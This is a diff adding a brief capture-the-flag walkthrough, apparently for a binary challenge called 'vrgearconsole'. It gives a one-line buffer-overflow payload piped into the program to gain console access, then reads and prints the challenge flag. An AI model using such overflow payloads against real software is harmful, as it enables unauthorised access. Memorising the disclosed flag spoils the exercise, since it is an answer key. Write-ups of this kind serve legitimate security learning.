@@ -1,0 +1,14 @@
+after connect to the shell
+change to the target directory: /problems/d07d574d3d27c5eeb03bce97956ef1c3
+
+then run the following command
+> (python -c 'print "A"*16+"\x19"'; cat) | ./vrgearconsole
+
+then we can access to the console with the access that we want
+
+then cat the flag.txt
+
+
+flag: 1ce8d7a95570d97333d52675fe099c27 
+
+ 
